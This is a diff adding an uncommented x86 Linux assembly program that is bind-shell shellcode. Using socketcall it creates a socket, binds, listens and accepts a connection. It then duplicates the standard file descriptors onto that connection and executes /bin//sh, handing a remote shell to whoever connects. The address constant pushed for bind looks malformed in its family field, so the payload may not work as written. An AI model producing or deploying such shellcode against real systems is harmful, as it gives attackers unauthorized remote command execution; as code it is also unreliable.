@@ -1,0 +1,51 @@
+global _start
+section .text
+_start:
+    push   0x66
+    pop    eax
+    xor    ebx,ebx
+    push   ebx
+    inc    ebx
+    push   ebx
+    push   0x2
+    mov    ecx,esp
+    int    0x80
+    xor    edx,edx
+    push   edx
+    push   0xc9fc02ff
+    mov    ecx,esp
+    push   0x10
+    push   ecx
+    push   eax
+    mov    ecx,esp
+    mov    esi,eax
+    inc    ebx
+    mov    al,0x66
+    int    0x80
+    mov    al,0x66
+    inc    ebx
+    inc    ebx
+    int    0x80
+    push   eax
+    push   esi
+    mov    ecx,esp
+    inc    ebx
+    mov    al,0x66
+    int    0x80
+    xchg   ebx,eax
+    push   0x3
+    pop    ecx
+loop:
+    dec    ecx
+    push   0x3f
+    pop    eax
+    int    0x80
+    jne    loop
+    mul    ecx
+    push   ecx
+    push   0x68732f2f
+    push   0x6e69622f
+    mov    ebx,esp
+    mov    al,0xb
+    int    0x80
+
